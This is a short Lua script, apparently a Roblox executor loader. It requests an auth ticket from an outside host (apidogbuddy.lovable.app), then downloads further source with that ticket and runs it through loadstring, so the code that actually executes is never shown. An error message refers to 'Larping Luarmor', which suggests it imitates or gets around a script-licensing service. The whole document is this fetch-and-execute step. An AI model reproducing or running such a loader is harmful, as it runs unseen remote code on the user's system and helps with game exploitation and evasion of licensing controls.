local t = game:HttpGet("https://apidogbuddy.lovable.app/api/public/files/e480021ed624804a?stage=auth")
local s = game:HttpGet("https://apidogbuddy.lovable.app/api/public/files/e480021ed624804a?stage=src&ticket=" .. game:GetService("HttpService"):UrlEncode(t))
local f, e = loadstring(s)
if not f then error("Larping Luarmor: " .. tostring(e)) end
return f()